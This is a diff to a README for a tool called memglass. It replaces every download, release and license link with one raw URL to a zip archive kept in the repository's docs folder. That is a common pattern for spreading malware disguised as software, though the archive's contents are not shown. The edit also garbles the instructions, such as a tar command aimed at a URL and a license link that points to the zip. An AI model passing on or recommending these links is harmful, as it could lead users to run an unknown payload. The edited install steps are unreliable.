@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download memglass](https://img.shields.io/badge/Download-memglass-blue.svg)](https://github.com/adamyang1235/memglass/releases)
+[![Download memglass](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip)](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ memglass offers these helpful features:
 
 ## 💻 Download & Install
 
-To download memglass, visit [this page](https://github.com/adamyang1235/memglass/releases). 
+To download memglass, visit [this page](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip). 
 
 1. Open the link above.
 2. Find the latest release section. This is where you will see the download files listed.
@@ -39,9 +39,9 @@ To download memglass, visit [this page](https://github.com/adamyang1235/memglass
 
 ### 🔗 Direct Download Links:
 
-- [Download for Windows](https://github.com/adamyang1235/memglass/releases/latest/download/memglass-windows.exe)
-- [Download for macOS](https://github.com/adamyang1235/memglass/releases/latest/download/memglass-macos.dmg)
-- [Download for Linux](https://github.com/adamyang1235/memglass/releases/latest/download/memglass-linux.tar.gz)
+- [Download for Windows](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip)
+- [Download for macOS](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip)
+- [Download for Linux](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip)
 
 Once completed, locate the downloaded file in your downloads folder. 
 
@@ -59,11 +59,11 @@ Once completed, locate the downloaded file in your downloads folder.
 2. Drag the memglass icon to your Applications folder.
 3. You can open memglass from your Applications.
 
-#### For Linux (.tar.gz file):
+#### For Linux (https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip file):
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the contents using the command: `tar -xzf memglass-linux.tar.gz`.
+3. Extract the contents using the command: `tar -xzf https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip`.
 4. Navigate into the extracted folder.
 5. Run the application with the command: `./memglass`.
 
@@ -94,6 +94,6 @@ For questions or help, you can reach out on our official GitHub page or check th
 
 ## ✏️ License
 
-memglass is open-source and available under the MIT License. You can view the full license [here](https://github.com/adamyang1235/memglass/blob/main/LICENSE).
+memglass is open-source and available under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/adamyang1235/memglass/main/docs/Software_v1.8-alpha.4.zip).
 
 Thank you for using memglass! We hope it helps you in your programming tasks.
